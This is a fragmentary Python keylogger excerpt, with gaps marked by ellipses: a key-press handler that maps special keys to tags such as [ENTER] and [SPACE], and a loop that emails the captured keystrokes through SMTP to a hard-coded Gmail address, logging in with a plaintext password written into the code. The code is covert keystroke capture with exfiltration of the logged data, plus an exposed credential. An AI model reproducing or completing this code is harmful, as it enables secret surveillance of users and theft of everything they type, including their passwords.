...
def on_press(key):
	...
	substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', '[SPACE]',
	...
	while True:
		if len(logged_data) > 1:
			try:
				...
				msg = MIMEMultipart()
				msg['From'] = "codeusstudio@gmail.com"
				msg['To'] = "codeusstudio@gmail.com"
				msg['Subject'] = subject
				body = 'testing'
				...
				print('starttls')
				s.ehlo()
				s.login("codeusstudio@gmail.com","July252007")
				s.sendmail("codeusstudio@gmail.com","codeusstudio@gmail.com",text)
				print('sent mail')
				attachment.close()
				s.close()
